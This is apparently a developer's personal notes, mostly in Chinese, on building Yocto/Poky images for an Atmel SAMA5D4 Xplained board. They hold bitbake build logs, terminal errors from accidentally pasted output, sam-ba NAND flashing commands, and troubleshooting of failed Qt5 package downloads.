WARNING: zlib-native-1.2.8-r0 do_fetch: Failed to fetch URL http://www.zlib.net/zlib-1.2.8.tar.xz, attempting MIRRORS if available
WARNING: quilt-native-0.64-r0 do_fetch: Failed to fetch URL http://download.savannah.gnu.org/releases/quilt/quilt-0.64.tar.gz, attempting MIRRORS if available
WARNING: attr-native-2.4.47-r0 do_fetch: Failed to fetch URL http://download.savannah.gnu.org/releases/attr/attr-2.4.47.src.tar.gz, attempting MIRRORS if available
WARNING: libpcre-native-8.38-r0 do_fetch: Failed to fetch URL ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.bz2, attempting MIRRORS if available
WARNING: bash-4.3.30-r0 do_fetch: Failed to fetch URL http://ftp.gnu.org/gnu/bash/bash-4.3-patches/bash43-033;apply=yes;striplevel=0;name=patch033, attempting MIRRORS if available
WARNING: sysvinit-2.88dsf-r14 do_fetch: Failed to fetch URL http://download.savannah.gnu.org/releases/sysvinit/sysvinit-2.88dsf.tar.bz2, attempting MIRRORS if available
NOTE: Tasks Summary: Attempted 1843 tasks of which 9 didn't need to be rerun and all succeeded.

Summary: There were 6 WARNING messages shown.



infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky$ source oe-init-build-env build-atmel
bash: infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky$: 没有那个文件或目录
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ You had no conf/local.conf file. This configuration file has therefore been
You：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ created for you with some default values. You may wish to edit it to, for
未找到 'created' 命令，您要输入的是否是：
 命令 'createdb' 来自于包 'postgresql-client-common' (main)
 命令 'createdb' 来自于包 'postgres-xc-client' (universe)
created：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ example, select a different MACHINE (target hardware). See conf/local.conf
bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ for more information as common configuration options are commented.
bash: 未预期的符号 `information' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ You had no conf/bblayers.conf file. This configuration file has therefore been
You：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ created for you with some default values. To add additional metadata layers
未找到 'created' 命令，您要输入的是否是：
 命令 'createdb' 来自于包 'postgres-xc-client' (universe)
 命令 'createdb' 来自于包 'postgresql-client-common' (main)
created：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ into your configuration please add entries to conf/bblayers.conf.
未找到 'into' 命令，您要输入的是否是：
 命令 'pinto' 来自于包 'pinto' (universe)
 命令 'info' 来自于包 'info' (main)
into：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ The Yocto Project has extensive documentation about OE including a reference
未找到 'The' 命令，您要输入的是否是：
 命令 'the' 来自于包 'the' (universe)
The：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ manual which can be found at:
manual：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$     http://yoctoproject.org/documentation
bash: http://yoctoproject.org/documentation: 没有那个文件或目录
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ For more information about OpenEmbedded see their website:
未找到 'For' 命令，您要输入的是否是：
 命令 'tor' 来自于包 'tor' (universe)
 命令 'sor' 来自于包 'pccts' (universe)
 命令 'vor' 来自于包 'vor' (universe)
For：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$     http://www.openembedded.org/
bash: http://www.openembedded.org/: 没有那个文件或目录
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ ### Shell environment set up for builds. ###
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ You can now run 'bitbake <target>'
You：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ Common targets are:
Common：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$     core-image-minimal
core-image-minimal：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$     core-image-sato
core-image-sato：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$     meta-toolchain
meta-toolchain：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$     meta-ide-support
meta-ide-support：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ You can also run generated qemu images with a command like 'runqemu qemux86'
You：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ bitbake core-image-minimal
bash: infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$: 没有那个文件或目录
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ Parsing recipes: 100% |###################################################################################################################################| Time: 00:00:30
> Parsing of 1934 .bb files complete (0 cached, 1934 parsed). 2490 targets, 379 skipped, 0 masked, 0 errors.
bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ NOTE: Resolving any missing task queue dependencies
NOTE:：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ Build Configuration:
未找到 'Build' 命令，您要输入的是否是：
 命令 'guild' 来自于包 'guile-2.0-libs' (main)
Build：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ BB_VERSION        = "1.30.0"
BB_VERSION：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ BUILD_SYS         = "x86_64-linux"
BUILD_SYS：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ NATIVELSBSTRING   = "Ubuntu-14.04"
NATIVELSBSTRING：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ TARGET_SYS        = "arm-poky-linux-gnueabi"
TARGET_SYS：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ MACHINE           = "sama5d4-xplained"
MACHINE：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ DISTRO            = "poky-atmel"
DISTRO：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ DISTRO_VERSION    = "2.1.2"
DISTRO_VERSION：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ TUNE_FEATURES     = "arm armv7a vfp thumb neon       callconvention-hard       cortexa5"
TUNE_FEATURES：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ TARGET_FPU        = "hard"
TARGET_FPU：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta              
未找到 'meta' 命令，您要输入的是否是：
 命令 'metar' 来自于包 'flightgear' (universe)
 命令 'metar' 来自于包 'metar' (universe)
meta：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-poky         
meta-poky：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-yocto-bsp    = "krogoth:ae9b341ecfcc60e970f29cfe04306411ad26c0cf"
meta-yocto-bsp：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-atmel        = "krogoth:c415e7330e6fd92e860423d144d6c98bf20c8887"
meta-atmel：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-oe           
meta-oe：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-networking   
meta-networking：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-python       
meta-python：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-ruby         
meta-ruby：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-multimedia   = "krogoth:55c8a76da5dc099a7bc3838495c672140cedb78e"
meta-multimedia：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ meta-qt5          = "krogoth:2b1871f0d139dc3caaa779a32a1931409c245a36"
meta-qt5：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ NOTE: Fetching uninative binary shim from http://downloads.yoctoproject.org/releases/uninative/1.0.1/x86_64-nativesdk-libc.tar.bz2;sha256sum=acf1e44a0ac2e855e81da6426197d36358bf7b4e88e552ef933128498c8910f8
NOTE:：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ NOTE: Preparing RunQueue
NOTE:：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ NOTE: Executing SetScene Tasks
NOTE:：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ NOTE: Executing RunQueue Tasks
NOTE:：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ WARNING: zlib-native-1.2.8-r0 do_fetch: Failed to fetch URL http://www.zlib.net/zlib-1.2.8.tar.xz, attempting MIRRORS if available
WARNING:：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ WARNING: quilt-native-0.64-r0 do_fetch: Failed to fetch URL http://download.savannah.gnu.org/releases/quilt/quilt-0.64.tar.gz, attempting MIRRORS if available
WARNING:：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ WARNING: attr-native-2.4.47-r0 do_fetch: Failed to fetch URL http://download.savannah.gnu.org/releases/attr/attr-2.4.47.src.tar.gz, attempting MIRRORS if available
WARNING:：未找到命令
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ Currently 8 running tasks (191 of 1843):
bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 0: gcc-source-5.3.0-5.3.0-r0 do_fetch (pid 15030)bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 1: ncurses-native-6.0+20160213-r0 do_fetch (pid 15046)
bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 2: binutils-cross-arm-2.26-r0 do_fetch (pid 15122)
bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 3: linux-libc-headers-4.4-r0 do_fetch (pid 15145)bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 4: glibc-initial-2.23-r0 do_fetch (pid 15156)
bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 5: glibc-2.23-r0 do_fetch (pid 28211)
bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 6: openssl-native-1.0.2h-r0 do_compile (pid 20726)
bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 7: xproto-native-1_7.0.28-r0 do_fetch (pid 11955)bash: 未预期的符号 `(' 附近有语法错误
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ 
/* 编译log: end*/
	过程中,有六个网上获取包失败!!!
	经过发现,后面的所谓命令找不到,极可能是以不正当的方式在输出一个报告文件,
	实际上已经全部编译完成!!!!!!镜像放在:
		/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/tmp/deploy/images/sama5d4-xplained
测试便以结果!!!!
只烧写了 dtb 和 zImage,成功!!! 
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x200000:0x600000 -c erase:0x180000:0x80000 -c write:zImage-at91-sama5d4_xplained.dtb:0x180000 -c write:zImage:0x200000
只烧写 uboot dtb zImage 成功!!!
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x40000:0x80000 -c erase:0x200000:0x600000 -c erase:0x180000:0x80000 -c write:u-boot.bin:0x40000 -c write:zImage-at91-sama5d4_xplained.dtb:0x180000 -c write:zImage:0x200000
只烧写 uboot dtb zImage fs成功!!!
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x40000:0x80000 -c erase:0x200000:0x600000 -c erase:0x180000:0x80000 -c erase:0x800000:0x1f800000 -c write:u-boot.bin:0x40000 -c write:zImage-at91-sama5d4_xplained.dtb:0x180000 -c write:zImage:0x200000 -c write:core-image-minimal-sama5d4-xplained.ubi:0x800000
都烧写:(注意,at91bootstrap居然 链接到uboot,也是uboot?你妹,名字差点就坑死我了,注意是spl-uboot!!) 
/* 不成功!!!!!!! */
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x0:0x40000 -c erase:0x40000:0x80000 -c erase:0x200000:0x600000 -c erase:0x180000:0x80000 -c erase:0x800000:0x1f800000 -c write:at91bootstrap-sama5d4_xplained.bin:0x0 -c write:u-boot.bin:0x40000 -c write:zImage-at91-sama5d4_xplained.dtb:0x180000 -c write:zImage:0x200000 -c write:core-image-minimal-sama5d4-xplained.ubi:0x800000
/* 成功 */  /* 注意,bootstrap 用 writeboot 指令 ,不用加地址 ":0x0" */
sudo sam-ba -p serial:ttyACM1:115200 -b sama5d4-xplained -a nandflash -c erase:0x0:0x40000 -c erase:0x40000:0x80000 -c erase:0x200000:0x600000 -c erase:0x180000:0x80000 -c erase:0x800000:0x1f800000 -c writeboot:at91bootstrap-sama5d4_xplained.bin -c write:u-boot.bin:0x40000 -c write:zImage-at91-sama5d4_xplained.dtb:0x180000 -c write:zImage:0x200000 -c write:core-image-minimal-sama5d4-xplained.ubi:0x800000
	至此,全部生成镜像 通过!!
	把景象文件全考到:core-image-minimal_demo文件夹备份
	另外,如何 更改内核配置!!! 而bitbake 又可以通过????
处理好 core-image-minimal 后,开始搭载 QT界面镜像的编译!!!
	特别注意,由于重启电脑的关系!!!!等等情况
	回到 poky 文件夹!!!
	重新执行一次: source oe-init-build-env build-atmel 指令!!!
	自动转到build-atmel
	把备份了的 build-atmel/conf 覆盖当前conf
	gedit conf/local.conf	//最后添加两行
		......
		LICENSE_FLAGS_WHITELIST += "commercial"
		SYSVINIT_ENABLED_GETTYS = ""
	然后才:bitbake atmel-qt5-demo-image	
	如果不重新执行 source oe-init-build-env build-atmel:
		直接修改 conf/local.conf
		然后执行 bitbake atmel-qt5-demo-image 会出现 bitbake命令没找到的错误!!!!!!
/* 编译log : start */
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky$ source oe-init-build-env build-atmel

### Shell environment set up for builds. ###

You can now run 'bitbake <target>'

Common targets are:
    core-image-minimal
    core-image-sato
    meta-toolchain
    meta-ide-support

You can also run generated qemu images with a command like 'runqemu qemux86'
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ bitbake atmel-qt5-demo-image
Loading cache: 100% |#####################################################################################################################################| ETA:  00:00:00
Loaded 2486 entries from dependency cache.
Parsing recipes: 100% |###################################################################################################################################| Time: 00:00:06
Parsing of 1934 .bb files complete (1929 cached, 5 parsed). 2490 targets, 358 skipped, 0 masked, 0 errors.
NOTE: Resolving any missing task queue dependencies

Build Configuration:
BB_VERSION        = "1.30.0"
BUILD_SYS         = "x86_64-linux"
NATIVELSBSTRING   = "universal"
TARGET_SYS        = "arm-poky-linux-gnueabi"
MACHINE           = "sama5d4-xplained"
DISTRO            = "poky-atmel"
DISTRO_VERSION    = "2.1.2"
TUNE_FEATURES     = "arm armv7a vfp thumb neon       callconvention-hard       cortexa5"
TARGET_FPU        = "hard"
meta              
meta-poky         
meta-yocto-bsp    = "krogoth:ae9b341ecfcc60e970f29cfe04306411ad26c0cf"
meta-atmel        = "krogoth:c415e7330e6fd92e860423d144d6c98bf20c8887"
meta-oe           
meta-networking   
meta-python       
meta-ruby         
meta-multimedia   = "krogoth:55c8a76da5dc099a7bc3838495c672140cedb78e"
meta-qt5          = "krogoth:2b1871f0d139dc3caaa779a32a1931409c245a36"

NOTE: Preparing RunQueue
NOTE: Executing SetScene Tasks
NOTE: Executing RunQueue Tasks
WARNING: apr-native-1.5.2-r0 do_fetch: Failed to fetch URL http://archive.apache.org/dist/apr/apr-1.5.2.tar.bz2, attempting MIRRORS if available
WARNING: libcap-2.24-r0 do_fetch: Failed to fetch URL http://kernel.org/pub/linux/libs/security/linux-privs/libcap2/libcap-2.24.tar.xz, attempting MIRRORS if available
WARNING: iso-codes-3.65-r0 do_fetch: Failed to fetch URL https://pkg-isocodes.alioth.debian.org/downloads/iso-codes-3.65.tar.xz, attempting MIRRORS if available
WARNING: libtirpc-1.0.1-r0 do_fetch: Failed to fetch URL http://distfiles.gentoo.org/distfiles/libtirpc-glibc-nfs.tar.xz;name=glibc-nfs, attempting MIRRORS if available
ERROR: libtirpc-1.0.1-r0 do_fetch: Fetcher failure: Fetch command failed with exit code 4, output:
wget: unable to resolve host address 'distfiles.gentoo.org'

ERROR: libtirpc-1.0.1-r0 do_fetch: Function failed: Fetcher failure for URL: 'http://distfiles.gentoo.org/distfiles/libtirpc-glibc-nfs.tar.xz;name=glibc-nfs'. Unable to fetch URL from any source.
ERROR: Logfile of failure stored in: /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/tmp/work/cortexa5hf-neon-poky-linux-gnueabi/libtirpc/1.0.1-r0/temp/log.do_fetch.9327
ERROR: Task 4195 (/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/meta/recipes-extended/libtirpc/libtirpc_1.0.1.bb, do_fetch) failed with exit code '1'
WARNING: qtbase-native-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Failed to fetch URL git://github.com/qt/qtbase.git;name=qtbase;branch=5.6;protocol=git, attempting MIRRORS if available
ERROR: qtbase-native-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Fetcher failure: Fetch command failed with exit code 128, output:
Cloning into bare repository '/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/downloads/git2/github.com.qt.qtbase.git'...
fatal: read error: Connection reset by peer
fatal: early EOF
fatal: index-pack failed

ERROR: qtbase-native-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Function failed: Fetcher failure for URL: 'git://github.com/qt/qtbase.git;name=qtbase;branch=5.6;protocol=git'. Unable to fetch URL from any source.
ERROR: Logfile of failure stored in: /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/tmp/work/x86_64-linux/qtbase-native/5.6.2+gitAUTOINC+b4ada3f0d8-r0/temp/log.do_fetch.3732
ERROR: Task 1923 (/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/meta-qt5/recipes-qt/qt5/qtbase-native_git.bb, do_fetch) failed with exit code '1'
WARNING: qtbase-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Failed to fetch URL git://github.com/qt/qtbase.git;name=qtbase;branch=5.6;protocol=git, attempting MIRRORS if available
ERROR: qtbase-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Fetcher failure: Fetch command failed with exit code 128, output:
Cloning into bare repository '/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/downloads/git2/github.com.qt.qtbase.git'...
fatal: read error: Connection timed out
fatal: early EOF
fatal: index-pack failed

ERROR: qtbase-5.6.2+gitAUTOINC+b4ada3f0d8-r0 do_fetch: Function failed: Fetcher failure for URL: 'git://github.com/qt/qtbase.git;name=qtbase;branch=5.6;protocol=git'. Unable to fetch URL from any source.
ERROR: Logfile of failure stored in: /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel/tmp/work/cortexa5hf-neon-poky-linux-gnueabi/qtbase/5.6.2+gitAUTOINC+b4ada3f0d8-r0/temp/log.do_fetch.3735
ERROR: Task 630 (/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/meta-qt5/recipes-qt/qt5/qtbase_git.bb, do_fetch) failed with exit code '1'
NOTE: Tasks Summary: Attempted 1498 tasks of which 1066 didn't need to be rerun and 3 failed.
Waiting for 0 running tasks to finish:

Summary: 3 tasks failed:
  /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/meta/recipes-extended/libtirpc/libtirpc_1.0.1.bb, do_fetch
  /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/meta-qt5/recipes-qt/qt5/qtbase-native_git.bb, do_fetch
  /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/meta-qt5/recipes-qt/qt5/qtbase_git.bb, do_fetch
Summary: There were 6 WARNING messages shown.
Summary: There were 6 ERROR messages shown, returning a non-zero exit code.
/* 编译log : end */
	log显示 qtbase-native-5.6.2+gitAUTOINC+b4ada3f0d8-r0 下载失败,感觉这个是关键!!
	测试生成的镜像,全部成功启动,就是不知道最终是否有图像帧输出!!!!
	感觉并没有QT界面demo程序的出现
感觉 bitbake atmel-qt5-demo-image 是失败了的,官网上 Build Atmel Poky Qt-Embedded SDK 是什么鬼??
	bitbake -c populate_sdk atmel-qt5-demo-image //先尝试,不管了,
	//这次鸣不需要重新执行一次: source oe-init-build-env build-atmel 指令!!! 估计是没有重启关系,配置文件没用删回原样!!
	//另外,观察是不是每次bitbake都要重新下载文件!!! 并没有重新下载文件!! 然而 qtbase包还是没有!!
/* log : start */
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ bitbake -C populate_sdk atmel-qt5-demo-image
Loading cache: 100% |#####################################################################################################################################| ETA:  00:00:00
Loaded 2486 entries from dependency cache.
Parsing recipes: 100% |###################################################################################################################################| Time: 00:00:36
Parsing of 1934 .bb files complete (1929 cached, 5 parsed). 2490 targets, 358 skipped, 0 masked, 0 errors.
NOTE: Resolving any missing task queue dependencies

Build Configuration:
BB_VERSION        = "1.30.0"
BUILD_SYS         = "x86_64-linux"
NATIVELSBSTRING   = "universal"
TARGET_SYS        = "arm-poky-linux-gnueabi"
MACHINE           = "sama5d4-xplained"
DISTRO            = "poky-atmel"
DISTRO_VERSION    = "2.1.2"
TUNE_FEATURES     = "arm armv7a vfp thumb neon       callconvention-hard       cortexa5"
TARGET_FPU        = "hard"
meta              
meta-poky         
